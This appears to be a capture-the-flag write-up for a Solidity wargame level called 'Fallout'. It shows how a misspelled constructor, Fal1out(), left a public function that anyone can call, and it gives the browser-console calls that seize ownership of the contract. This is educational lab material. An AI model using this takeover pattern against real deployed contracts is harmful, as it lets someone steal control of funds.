# **Level 02 — Fallout**

## 🎯 Goal  
To claim ownership of the contract.

## 💥 Vulnerability  
In older versions of Solidity, constructors were defined by naming a function exactly like the name of the contract.  
This contract contains `function Fal1out()`, but due to a typo (`1` instead of `l`), it became a regular public function.  
As a result, anyone can call it and assign themselves as the owner.

The part of the vulnerable code:
```solidity 
// Solidity code 
/* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check current owner
await contract.owner()

// 1. Call the misnamed constructor to become owner 
await contract.Fal1out()

// 2. Confirm new ownership
await contract.owner()
```

## 🧙 Outcome
Ownership was successfully taken by calling the public `Fal1out()` function.  
This exploited the constructor naming bug, allowing takeover after deployment.
